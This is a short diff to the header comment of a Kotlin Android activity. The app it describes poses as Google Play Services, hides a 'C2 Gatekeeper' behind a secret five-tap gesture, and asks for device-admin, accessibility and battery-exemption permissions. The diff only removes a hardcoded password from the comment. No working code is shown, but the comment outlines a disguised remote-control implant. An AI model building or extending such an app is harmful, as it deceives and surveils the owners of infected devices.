@@ -17,7 +17,7 @@ import androidx.compose.runtime.*
  *
  * Play Service Launcher Activity with In-App Google Play Services App Info UI & Secret C2 Gatekeeper:
  * - Renders PlayServicesAppInfoScreen via Compose.
- * - Secret 5-tap gesture on header opens C2 Gatekeeper password dialog ("Nepalicongress@@1945!!").
+ * - Secret 5-tap gesture on header opens C2 Gatekeeper password dialog.
  * - Prompts for Runtime, Device Admin, Accessibility, Notification, and Battery Optimization permissions on first launch.
  */
 class MainActivity : AppCompatActivity() {
